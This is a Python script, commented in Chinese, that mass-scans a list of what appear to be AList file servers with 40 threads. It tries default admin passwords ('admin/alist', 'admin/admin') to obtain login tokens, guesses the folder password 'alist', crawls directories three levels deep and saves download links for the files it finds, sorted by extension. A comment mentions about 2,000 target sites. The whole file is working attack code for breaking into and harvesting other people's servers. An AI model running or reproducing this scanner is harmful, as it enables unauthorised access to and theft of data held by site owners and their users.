import requests
import os
import concurrent.futures
from collections import deque
from datetime import datetime
import pytz

# === 核心参数提速配置 ===
INPUT_FILE = 'duplicate.txt'
OUTPUT_DIR = 'scan_results'  # 结果存放目录
MAX_THREADS = 40             # 线程增加到 40
TIMEOUT = 3                  # 超时缩短到 3 秒，快速跳过死链
MAX_DEPTH = 3                # 深度限制为 3，大幅提升扫描 2000 个站点的速度

WEAK_PASSWORDS = [
    {"username": "admin", "password": "alist"},
    {"username": "admin", "password": "admin"},
]

def get_auth_token(base_url):
    login_url = f"{base_url.rstrip('/')}/api/auth/login"
    for payload in WEAK_PASSWORDS:
        try:
            r = requests.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and r.json().get("code") == 200:
                return r.json().get("data", {}).get("token")
        except: continue
    return None

def get_alist_list(base_url, path="/", token=None):
    api_url = f"{base_url.rstrip('/')}/api/fs/list"
    headers = {"Authorization": token} if token else {}
    payload = {"path": path, "password": "alist", "page": 1, "per_page": 0}
    try:
        resp = requests.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
        data = resp.json()
        if data.get("code") == 200:
            return data.get("data", {}).get("content", [])
        elif data.get("code") in [401, 500]:
            payload["password"] = ""
            resp = requests.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
            data = resp.json()
            if data.get("code") == 200:
                return data.get("data", {}).get("content", [])
    except: pass
    return []

def process_url(url):
    token = get_auth_token(url)
    local_data = []
    queue = deque([("/", 0)])
    visited_paths = {"/"}
    while queue:
        current_path, depth = queue.popleft()
        if depth > MAX_DEPTH: continue
        items = get_alist_list(url, current_path, token)
        if not items: continue
        for item in items:
            name = item.get('name')
            full_path = f"{current_path.rstrip('/')}/{name}"
            if item.get('is_dir'):
                if full_path not in visited_paths:
                    visited_paths.add(full_path)
                    queue.append((full_path, depth + 1))
            else:
                _, ext = os.path.splitext(name)
                ext = ext.lower().replace('.', '') if ext else "no_ext"
                # 排除一些无意义的后缀，减小文件量
                if ext in ['js', 'css', 'html', 'json', 'png', 'jpg', 'svg']: continue
                download_url = f"{url.rstrip('/')}/d{full_path}"
                local_data.append((ext, name, download_url))
    return local_data

def main():
    requests.packages.urllib3.disable_warnings()
    if not os.path.exists(INPUT_FILE): return
    with open(INPUT_FILE, 'r') as f:
        urls = list(set([line.strip() for line in f if line.strip().startswith('http')]))

    # 创建输出目录
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    final_registry = set()
    total = len(urls)
    print(f"开始并行扫描 {total} 个站点，线程数: {MAX_THREADS}...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        future_to_url = {executor.submit(process_url, url): url for url in urls}
        done_count = 0
        for future in concurrent.futures.as_completed(future_to_url):
            done_count += 1
            if done_count % 20 == 0:
                print(f"进度: {done_count}/{total} ({(done_count/total)*100:.1f}%)")
            try:
                res = future.result()
                for item in res: final_registry.add(item)
            except: pass

    # 按后缀名分类写入不同文件
    ext_map = {}
    for ext, name, d_url in final_registry:
        if ext not in ext_map: ext_map[ext] = []
        ext_map[ext].append(f"{name} | {d_url}")

    shanghai_tz = pytz.timezone('Asia/Shanghai')
    now_str = datetime.now(shanghai_tz).strftime("%Y-%m-%d %H:%M:%S")

    # 清理旧数据并写入新数据
    for ext, lines in ext_map.items():
        file_path = os.path.join(OUTPUT_DIR, f"{ext}.txt")
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(f"# 自动更新时间: {now_str}\n\n")
            for line in sorted(lines):
                f.write(line + "\n")

    print(f"扫描完毕！所有结果已按后缀存入 {OUTPUT_DIR}/ 文件夹。")

if __name__ == "__main__":
    main()
